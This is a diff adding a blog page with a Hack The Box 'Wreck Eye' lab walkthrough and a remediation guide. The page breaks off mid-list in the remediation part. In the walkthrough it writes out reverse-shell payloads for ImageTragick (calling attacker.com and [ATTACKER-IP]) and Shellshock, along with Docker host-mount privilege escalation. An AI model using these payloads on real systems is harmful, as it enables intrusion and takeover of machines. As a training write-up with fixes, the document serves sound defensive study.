@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Wreck Eye HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Complete walkthrough of Wreck Eye HTB machine featuring network segmentation, Shellshock and ImageTragick exploits, SSH pivoting through containers, and Docker privilege escalation techniques" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/posts/wreck-eye-htb-walkthrough/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="http://localhost:1313/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Wreck Eye HTB - Insane Linux Box Walkthrough">
+<meta property="og:description" content="Complete walkthrough of Wreck Eye HTB machine featuring network segmentation, Shellshock and ImageTragick exploits, SSH pivoting through containers, and Docker privilege escalation techniques" />
+<meta property="og:url" content="http://localhost:1313/posts/wreck-eye-htb-walkthrough/" />
+<meta property="og:site_name" content="VAPT Walkthroughs" />
+
+  <meta property="og:image" content="http://localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="HTB" />
+
+  <meta property="article:section" content="Linux" />
+
+
+  <meta property="article:published_time" content="2025-09-22 10:15:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/search">Search</a></li>
+        
+      
+        
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
+          <li><a href="/difficulty">Difficulty</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/" >Home</a></li>
+        
+      
+        
+          <li><a href="/search" >Search</a></li>
+        
+      
+        
+          <li><a href="/tags" >Tags</a></li>
+        
+      
+        
+          <li><a href="/difficulty" >Difficulty</a></li>
+        
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/wreck-eye-htb-walkthrough/">Wreck Eye HTB - Insane Linux Box Walkthrough</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-09-22</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/insane-linux/">insane-linux</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/nmap/">nmap</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/virtual-hosts/">virtual-hosts</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/shellshock/">shellshock</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/imagetragick/">imagetragick</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/ssh-pivoting/">ssh-pivoting</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/docker-escape/">docker-escape</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/privilege-escalation/">privilege-escalation</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/cve-2014-6271/">cve-2014-6271</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/cve-2016-3714/">cve-2016-3714</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/network-segmentation/">network-segmentation</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/container-exploitation/">container-exploitation</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="wreck-eye-htb---insane-linux-box-walkthrough">Wreck Eye HTB - Insane Linux Box Walkthrough<a href="#wreck-eye-htb---insane-linux-box-walkthrough" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/Pc4tzsn-ats?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
+
+<h2 id="key-exploitation-steps-and-techniques">Key Exploitation Steps and Techniques<a href="#key-exploitation-steps-and-techniques" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Below is a chronological summary of the key exploitation steps and techniques used to compromise the &ldquo;Wreck Eye&rdquo; machine from Hack The Box, as described in the provided data.</p>
+<h3 id="1-initial-reconnaissance-with-nmap">1. Initial Reconnaissance with Nmap<a href="#1-initial-reconnaissance-with-nmap" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Network scanning using Nmap to identify open ports and services.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>Ran <code>nmap -sC -sV -oA nmap_initial [TARGET-IP]</code> to scan the target IP.</li>
+<li>Identified open ports: SSH on 22, Nginx (HTTP) on 443, and SSH on 1022.</li>
+<li>Noted different SSH host keys and Ubuntu versions (Trusty and Xenial), indicating multiple hosts or network address translation (NAT).</li>
+<li>Observed SSL certificate with Subject Alternative Names (SANs): <code>calvin.direct.ih.db</code> and <code>beehive.direct.ih.db</code>, hinting at virtual host routing.</li>
+</ul>
+<p><strong>Purpose</strong>: Gather initial information about the target, identify potential entry points, and detect network segmentation.</p>
+<h3 id="2-web-enumeration-and-virtual-host-routing">2. Web Enumeration and Virtual Host Routing<a href="#2-web-enumeration-and-virtual-host-routing" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Web enumeration using GoBuster and manual inspection via Burp Suite.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>Visited <code>https://[TARGET-IP]:443</code> and found a maintenance page with no significant content.</li>
+<li>Ran GoBuster: <code>gobuster dir -u https://[TARGET-IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 50 --status 403</code> to enumerate directories, discovering <code>/blog</code> and <code>/cgi-bin</code>.</li>
+<li>Identified virtual host routing by testing hostnames (<code>beehive.direct.ih.db</code> and <code>calvin.direct.ih.db</code>) via Burp Suite Repeater, noting different responses (e.g., 404 for <code>calvin.direct.ih.db</code>).</li>
+<li>Confirmed presence of a Web Application Firewall (WAF) via the <code>X-RackI-Laughs</code> header.</li>
+</ul>
+<p><strong>Purpose</strong>: Identify web directories, confirm virtual host routing, and detect WAF presence.</p>
+<h3 id="3-shellshock-vulnerability-exploitation">3. Shellshock Vulnerability Exploitation<a href="#3-shellshock-vulnerability-exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Exploiting the Shellshock vulnerability (CVE-2014-6271) in a CGI script.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>Discovered <code>/cgi-bin/stats</code> on <code>beehive.direct.ih.db</code>, which returned Bash version 4.3, known to be vulnerable to Shellshock.</li>
+<li>Attempted Shellshock exploitation by modifying the User-Agent header in Burp Suite Repeater to <code>() { :;}; echo; /bin/whoami</code>, but the WAF blocked it due to specific signatures (e.g., <code>() {</code>).</li>
+<li>Failed to bypass WAF after fuzzing attempts, indicating a potential rabbit hole.</li>
+</ul>
+<p><strong>Purpose</strong>: Attempt to gain initial code execution on the beehive host via Shellshock, though blocked by WAF.</p>
+<h3 id="4-imagetragick-vulnerability-exploitation">4. ImageTragick Vulnerability Exploitation<a href="#4-imagetragick-vulnerability-exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Exploiting ImageTragick (CVE-2016-3714) via file upload on <code>calvin.direct.ih.db</code>.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>Discovered <code>/uploads</code> on <code>calvin.direct.ih.db</code> with an image upload feature.</li>
+<li>Noted a hint in the form of &ldquo;tragedy masks&rdquo; referencing ImageTragick, a vulnerability in ImageMagick allowing command injection via malicious image files.</li>
+<li>Created a malicious <code>.mvg</code> file with a payload for a reverse shell: <code>fill 'url(https://attacker.com|setsid /bin/bash -i &gt;&amp; /dev/tcp/[ATTACKER-IP]/443 0&gt;&amp;1)'</code>.</li>
+<li>Uploaded the file via Burp Suite, correcting an encoding issue (hex 22 for quotes) from a CloudFlare blog reference.</li>
+<li>Successfully triggered a reverse shell to the attacker&rsquo;s machine (<code>[ATTACKER-IP]:443</code>), gaining access to the calvin container.</li>
+</ul>
+<p><strong>Purpose</strong>: Gain a reverse shell on the calvin container by exploiting ImageTragick.</p>
+<h3 id="5-pivoting-to-bastion-host">5. Pivoting to Bastion Host<a href="#5-pivoting-to-bastion-host" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Using SSH key for lateral movement and network pivoting.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>On the calvin container (IP: 172.23.0.11), found a hidden <code>.secrets</code> directory containing <code>bastion_key</code>.</li>
+<li>Used the key to SSH into <code>[TARGET-IP]:1022</code>, landing on the bastion host (dual-homed with IPs 172.23.0.253 and 172.24.0.253).</li>
+<li>Confirmed bastion host connects to both 172.23.0.0/24 and 172.24.0.0/24 networks, allowing access to other containers.</li>
+</ul>
+<p><strong>Purpose</strong>: Pivot from calvin to the bastion host for further network exploration.</p>
+<h3 id="6-accessing-the-beehive-container">6. Accessing the Beehive Container<a href="#6-accessing-the-beehive-container" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: SSH tunneling and Shellshock exploitation on the beehive container.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>On the bastion host, set up an SSH tunnel using <code>~C</code> and <code>-L 8001:172.24.0.2:80</code> to forward traffic to the beehive container.</li>
+<li>Accessed <code>http://localhost:8001/cgi-bin/stats</code> and successfully exploited Shellshock (no WAF interference) with a reverse shell payload: <code>() { :;}; /bin/bash -i &gt;&amp; /dev/tcp/172.24.0.253/8002 0&gt;&amp;1</code>.</li>
+<li>Gained a reverse shell on the beehive container, confirmed by spawning a Python TTY shell.</li>
+</ul>
+<p><strong>Purpose</strong>: Gain code execution on the beehive container by bypassing the WAF using internal network access.</p>
+<h3 id="7-privilege-escalation-to-root-on-containers">7. Privilege Escalation to Root on Containers<a href="#7-privilege-escalation-to-root-on-containers" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Extracting and using root credentials from shared Docker configuration.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>On the beehive container, navigated to <code>/common/containers/bastion/Dockerfile</code> and found a root password shared across all containers.</li>
+<li>Used <code>su</code> with the password to escalate to root on beehive, calvin, and bastion containers.</li>
+</ul>
+<p><strong>Purpose</strong>: Achieve root access on all Docker containers.</p>
+<h3 id="8-pivoting-to-the-host-machine">8. Pivoting to the Host Machine<a href="#8-pivoting-to-the-host-machine" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: SSH key cracking and privilege escalation via Docker group membership.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>Found an SSH private key for the <code>spanish_dancer</code> user in <code>/home/spanish_dancer/.ssh/id_rsa</code> on a container.</li>
+<li>Cracked the key using John the Ripper with the password <code>purple1</code>.</li>
+<li>Used the key to SSH into the host machine (<code>[TARGET-IP]</code>) as <code>spanish_dancer</code>.</li>
+<li>Identified <code>spanish_dancer</code> as part of the <code>docker</code> group, allowing privilege escalation via Docker.</li>
+</ul>
+<p><strong>Purpose</strong>: Gain access to the host machine as a low-privileged user.</p>
+<h3 id="9-host-privilege-escalation-via-docker">9. Host Privilege Escalation via Docker<a href="#9-host-privilege-escalation-via-docker" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Docker privilege escalation by mounting the host filesystem.</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>Ran <code>docker run -v /:/mnt -i -t bash</code> to mount the host&rsquo;s root filesystem to <code>/mnt</code> in a new container.</li>
+<li>Accessed <code>/mnt/root</code> to retrieve <code>root.txt</code>.</li>
+<li>Alternatively, added an SSH key to <code>/mnt/root/.ssh/authorized_keys</code> and used it to SSH as the root user to <code>[TARGET-IP]</code>.</li>
+</ul>
+<p><strong>Purpose</strong>: Achieve root access on the host machine by exploiting Docker group privileges.</p>
+<h3 id="10-alternative-root-access-attempt-via-cron">10. Alternative Root Access Attempt via Cron<a href="#10-alternative-root-access-attempt-via-cron" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><strong>Technique</strong>: Attempted to leverage a cron job for code execution (unsuccessful).</p>
+<p><strong>Details</strong>:</p>
+<ul>
+<li>Tried creating a cron job in <code>/mnt/var/spool/cron/crontabs/root</code> to run a reverse shell, but it failed due to configuration errors.</li>
+<li>Abandoned this approach in favor of the SSH key method.</li>
+</ul>
+<p><strong>Purpose</strong>: Explore alternative methods for host root access (not successful).</p>
+<h2 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The exploitation process involved:</p>
+<ol>
+<li>Initial reconnaissance to identify network segmentation and virtual hosts.</li>
+<li>Exploiting ImageTragick for initial access to the calvin container.</li>
+<li>Pivoting to the bastion host using an SSH key.</li>
+<li>Bypassing the WAF to exploit Shellshock on the beehive container.</li>
+<li>Escalating to root on containers using shared credentials.</li>
+<li>Pivoting to the host machine and escalating privileges via Docker group membership.</li>
+</ol>
+<p>This sequence leveraged network pivoting, vulnerability exploitation, and privilege escalation to fully compromise the &ldquo;Wreck Eye&rdquo; machine.</p>
+<h2 id="security-gaps-and-remediation">Security Gaps and Remediation<a href="#security-gaps-and-remediation" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Below is a list of identified gaps in services or systems from the &ldquo;Wreck Eye&rdquo; Hack The Box scenario, along with specific fixes that can be applied through proper source code or configuration changes. Each gap is tied to the vulnerabilities and misconfigurations exploited in the provided data, focusing on actionable remediation steps.</p>
+<h3 id="1-web-application-firewall-waf-misconfiguration">1. Web Application Firewall (WAF) Misconfiguration<a href="#1-web-application-firewall-waf-misconfiguration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The WAF (indicated by the <code>X-RackI-Laughs</code> header) failed to adequately protect the <code>beehive</code> container from Shellshock exploitation when accessed internally via the <code>bastion</code> host, despite blocking it externally.</li>
+<li><strong>Impact</strong>: Allowed internal Shellshock exploitation on <code>/cgi-bin/stats</code>, bypassing WAF protections.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Update WAF rules to consistently block Shellshock signatures (e.g., <code>() { :;};</code>) across all network interfaces, not just external traffic.</li>
+<li>Ensure WAF applies to internal traffic (e.g., from <code>172.24.0.0/24</code> network) by configuring it to inspect all requests to the <code>beehive</code> container, regardless of source.</li>
+<li>Implement deep packet inspection to detect encoded or obfuscated Shellshock payloads (e.g., spaces or alternative characters).</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If the WAF is custom-built, update the signature detection logic to handle variations of Shellshock payloads (e.g., spaces, encoded characters) and log all blocked attempts for auditing.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Test WAF effectiveness by simulating Shellshock attempts from both external and internal networks, ensuring no payloads bypass the filter.</li>
+</ul>
+<h3 id="2-shellshock-vulnerability-in-bash-cve-2014-6271">2. Shellshock Vulnerability in Bash (CVE-2014-6271)<a href="#2-shellshock-vulnerability-in-bash-cve-2014-6271" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The <code>beehive</code> container ran Bash version 4.3, vulnerable to Shellshock, allowing command injection via the <code>/cgi-bin/stats</code> script.</li>
+<li><strong>Impact</strong>: Enabled code execution and reverse shell establishment on the <code>beehive</code> container.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Upgrade Bash to a patched version (e.g., 4.3.30 or later) where Shellshock vulnerabilities (CVE-2014-6271, CVE-2014-7169) are fixed.</li>
+<li>Disable or remove unnecessary CGI scripts (<code>/cgi-bin/stats</code>) to reduce the attack surface.</li>
+<li>Restrict CGI execution in Apache/Nginx configuration by limiting <code>ScriptAlias</code> to trusted scripts or disabling it entirely if not needed (<code>Options -ExecCGI</code> in Apache).</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If custom CGI scripts are used, sanitize environment variables (e.g., <code>HTTP_USER_AGENT</code>) to prevent command injection.</li>
+<li>Implement input validation in the <code>stats</code> script to reject malformed or suspicious inputs.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Run <code>bash --version</code> to confirm the updated version and test <code>/cgi-bin/stats</code> with Shellshock payloads to ensure no execution occurs.</li>
+</ul>
+<h3 id="3-imagetragick-vulnerability-in-imagemagick-cve-2016-3714">3. ImageTragick Vulnerability in ImageMagick (CVE-2016-3714)<a href="#3-imagetragick-vulnerability-in-imagemagick-cve-2016-3714" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The <code>calvin</code> container&rsquo;s image upload functionality (via <code>/uploads</code>) used a vulnerable version of ImageMagick, susceptible to ImageTragick command injection.</li>
+<li><strong>Impact</strong>: Allowed attackers to upload malicious <code>.mvg</code> files, leading to a reverse shell.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Upgrade ImageMagick to a version patched against CVE-2016-3714 (e.g., 6.9.3-9 or later).</li>
+<li>Configure ImageMagick&rsquo;s policy file (<code>/etc/ImageMagick-6/policy.xml</code>) to disable vulnerable file formats (e.g., MVG, MSL) by adding:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">domain=</span><span style="color:#e6db74">&#34;coder&#34;</span> <span style="color:#a6e22e">rights=</span><span style="color:#e6db74">&#34;none&#34;</span> <span style="color:#a6e22e">pattern=</span><span style="color:#e6db74">&#34;MVG&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;policy</span> <span style="color:#a6e22e">domain=</span><span style="color:#e6db74">&#34;coder&#34;</span> <span style="color:#a6e22e">rights=</span><span style="color:#e6db74">&#34;none&#34;</span> <span style="color:#a6e22e">pattern=</span><span style="color:#e6db74">&#34;MSL&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span></code></pre></div></li>
+<li>Restrict file uploads to safe formats (e.g., PNG, JPEG) using server-side validation in the upload handler.</li>
+<li>Limit the upload directory&rsquo;s permissions to prevent execution of uploaded files (<code>chmod 644 /uploads</code>).</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>Implement strict file type validation in the upload script to reject non-image files (e.g., check MIME types and file signatures).</li>
+<li>Sanitize file contents to prevent command injection (e.g., strip metadata or use a sandboxed ImageMagick process).</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Test uploads with malicious <code>.mvg</code> files to ensure they are rejected or processed safely without command execution.</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-insecure-ssh-key-storage">4. Insecure SSH Key Storage<a href="#4-insecure-ssh-key-storage" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: A private SSH key (<code>bastion_key</code>) was stored in a readable directory (<code>/common/.secrets</code>) on the <code>calvin</code> container, accessible to attackers with initial access.</li>
+<li><strong>Impact</strong>: Enabled pivoting to the <code>bastion</code> host via SSH (<code>[TARGET-IP]:1022</code>).</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Remove unnecessary SSH keys from containers and store them securely (e.g., in a vault or encrypted storage accessible only to authorized services).</li>
+<li>Restrict file permissions on sensitive directories (e.g., <code>chmod 600 /common/.secrets/bastion_key</code> and <code>chown root:root /common/.secrets</code>).</li>
+<li>Disable SSH access to containers unless strictly required, or use temporary credentials with short-lived keys.</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If SSH key generation is scripted, ensure keys are created with restricted permissions (e.g., <code>0600</code>) and stored in a secure location inaccessible to non-root users.</li>
+<li>Implement a key management system to rotate and revoke keys automatically.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Check file permissions (<code>ls -la /common/.secrets</code>) and attempt unauthorized access to confirm keys are inaccessible.</li>
+</ul>
+</li>
+</ul>
+<h3 id="5-weak-ssh-key-passphrase">5. Weak SSH Key Passphrase<a href="#5-weak-ssh-key-passphrase" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The SSH private key for the <code>spanish_dancer</code> user was encrypted with a weak passphrase (<code>purple1</code>), easily cracked using John the Ripper.</li>
+<li><strong>Impact</strong>: Allowed access to the host machine as the <code>spanish_dancer</code> user.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Enforce strong passphrases for SSH keys using policies (e.g., minimum length, complexity requirements).</li>
+<li>Use SSH key management tools (e.g., OpenSSH&rsquo;s <code>ssh-agent</code> or HashiCorp Vault) to avoid storing passphrases in plaintext or weak formats.</li>
+<li>Regularly audit and rotate SSH keys to minimize the impact of compromised keys.</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If keys are generated programmatically, enforce strong passphrase generation using a secure random generator (e.g., <code>/dev/urandom</code> or a cryptographic library).</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Attempt to crack SSH keys with tools like John the Ripper to ensure passphrases resist brute-forcing.</li>
+</ul>
+</li>
+</ul>
+<h3 id="6-shared-root-password-across-docker-containers">6. Shared Root Password Across Docker Containers<a href="#6-shared-root-password-across-docker-containers" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: A single root password was embedded in the <code>Dockerfile</code> under <code>/common/containers/bastion</code>, shared across all containers (<code>calvin</code>, <code>beehive</code>, <code>bastion</code>).</li>
+<li><strong>Impact</strong>: Allowed root privilege escalation on all containers after initial access.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Remove hardcoded passwords from <code>Dockerfile</code> and use secure secret management (e.g., Docker Secrets, AWS Secrets Manager, or environment variables).</li>
+<li>Enforce unique credentials for each container and disable root logins (<code>PermitRootLogin no</code> in <code>/etc/ssh/sshd_config</code>).</li>
+<li>Use least privilege principles, running containers as non-root users where possible (<code>USER nonroot</code> in <code>Dockerfile</code>).</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If passwords are managed programmatically, implement secure credential injection using a secrets management API instead of embedding in configuration files.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Check <code>Dockerfile</code> and container configurations for hardcoded credentials and test non-root operation of services.</li>
+</ul>
+</li>
+</ul>
+<h3 id="7-docker-group-privilege-escalation">7. Docker Group Privilege Escalation<a href="#7-docker-group-privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: The <code>spanish_dancer</code> user on the host machine was part of the <code>docker</code> group, allowing unrestricted Docker commands to mount the host filesystem and gain root access.</li>
+<li><strong>Impact</strong>: Enabled privilege escalation by running a Docker container with the host&rsquo;s root filesystem mounted (<code>docker run -v /:/mnt</code>).</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Remove non-essential users from the <code>docker</code> group to prevent unauthorized container execution (<code>gpasswd -d spanish_dancer docker</code>).</li>
+<li>Restrict Docker socket access (<code>/var/run/docker.sock</code>) to root only (<code>chmod 600 /var/run/docker.sock</code>).</li>
+<li>Use Docker&rsquo;s user namespace feature to isolate container privileges, preventing host filesystem access.</li>
+<li>Implement Role-Based Access Control (RBAC) for Docker operations, limiting who can run privileged containers.</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If Docker is managed via scripts, enforce strict user checks to prevent non-root users from executing privileged commands.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Test Docker commands as a non-root user to ensure privilege escalation is blocked.</li>
+</ul>
+</li>
+</ul>
+<h3 id="8-exposed-docker-configuration-files">8. Exposed Docker Configuration Files<a href="#8-exposed-docker-configuration-files" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: Sensitive Docker configuration files (e.g., <code>/common/containers</code>) were accessible within containers, exposing network details and credentials.</li>
+<li><strong>Impact</strong>: Provided attackers with network topology (<code>172.23.0.0/24</code>, <code>172.24.0.0/24</code>) and credentials for pivoting.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Restrict access to the <code>/common</code> directory with strict permissions (<code>chmod 700 /common</code>, <code>chown root:root /common</code>).</li>
+<li>Avoid mounting sensitive directories into containers unless necessary, using Docker&rsquo;s volume management to isolate configurations.</li>
+<li>Use Docker&rsquo;s <code>read-only</code> filesystem option for containers (<code>docker run --read-only</code>) to prevent modifications to sensitive files.</li>
+</ul>
+</li>
+<li><strong>Source Code Fix</strong>:
+<ul>
+<li>If configuration files are generated programmatically, ensure sensitive data is excluded or encrypted before being mounted into containers.</li>
+</ul>
+</li>
+<li><strong>Verification</strong>: Attempt to access <code>/common</code> from within containers as a non-root user to confirm inaccessibility.</li>
+</ul>
+</li>
+</ul>
+<h3 id="9-unnecessary-ssh-services-on-multiple-ports">9. Unnecessary SSH Services on Multiple Ports<a href="#9-unnecessary-ssh-services-on-multiple-ports" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li><strong>Gap</strong>: SSH services were running on both ports 22 and 1022, with different host keys and Ubuntu versions, increasing the attack surface and hinting at NAT or misconfiguration.</li>
+<li><strong>Impact</strong>: Provided multiple entry points, with the older version (Trusty) being more vulnerable.</li>
+<li><strong>Fix</strong>:
+<ul>
+<li><strong>Configuration Fix</strong>:
+<ul>
+<li>Consolidate SSH services to a single port (e.g., 22) and disable unnecessary instances (<code>systemctl disable sshd@1022</code>).</li>
+<li>Upgrade all SSH servers to the latest version of OpenSSH and patch the underlying OS (e.g., from Trusty to a supported version).</li>
+<li>Harden SSH configuration in <code>/etc/ssh/sshd_config</code>:
+<ul>
+<li>Disable root login (<code>PermitRootLogin no</code>).</li>
